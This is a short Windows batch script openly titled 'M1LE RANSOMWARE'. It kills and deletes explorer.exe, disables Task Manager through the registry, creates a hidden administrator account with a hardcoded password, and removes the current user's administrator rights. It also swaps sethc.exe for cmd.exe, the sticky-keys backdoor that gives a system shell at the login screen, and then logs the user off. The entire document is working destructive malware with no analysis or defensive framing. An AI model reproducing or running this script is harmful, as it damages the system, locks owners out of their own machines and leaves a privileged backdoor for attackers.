

cls
@echo off
title M1LE RANSOMWARE
.\warning.vbs
taskkill /f /im explorer.exe
del /f C:\windows\explorer.exe
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f,
net user /add m1le HBM1LE
net localgroup Administrators /add m1le
net localgroup Administrators /delete %username%
net user m1le /active:no
cd C:\Windows\system32\
xcopy cmd.exe sethc.exe
shutdown -l